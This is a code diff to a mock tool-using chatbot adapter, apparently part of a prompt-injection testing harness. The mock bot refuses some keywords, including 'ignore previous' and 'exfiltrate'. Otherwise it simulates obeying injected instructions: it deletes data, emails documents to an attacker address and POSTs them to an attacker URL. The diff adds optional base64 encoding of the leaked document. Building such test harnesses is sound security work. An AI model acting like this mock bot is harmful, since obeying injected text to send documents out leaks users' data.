@@ -19,6 +19,7 @@ shows a finding going from FAIL to PASS.
 
 from __future__ import annotations
 
+import base64
 import re
 from typing import Any
 
@@ -66,7 +67,7 @@ class ToolBotAdapter:
                                    "http", "forward", "exfiltrate", "document", "ignore previous"):
             return Observation(response="I can't do that.", tool_calls=[])
 
-        url = (_URL.findall(payload) or [self.attacker_url])[0]
+        url = ([u.rstrip(".,;:!?") for u in _URL.findall(payload)] or [self.attacker_url])[0]
         email = (_EMAIL.findall(payload) or [self.attacker_email])[0]
 
         if _has(text, "delete", "drop table", "wipe", "truncate"):
@@ -83,8 +84,9 @@ class ToolBotAdapter:
             reply = f"I've emailed that to {email}."
         elif _has(text, "post", "upload", "http", "exfiltrate", "forward", "collect"):
             calls.append(self._retrieve("escalation notes"))
+            body = base64.b64encode(self.document.encode()).decode() if "base64" in text else self.document
             calls.append(ToolCall(
-                name="http_request", arguments={"method": "POST", "url": url, "body": self.document},
+                name="http_request", arguments={"method": "POST", "url": url, "body": body},
                 result="200 OK"))
             reply = f"Sent. I posted it to {url}."
         elif _has(text, "show me the document", "print the document", "what does the document say"):
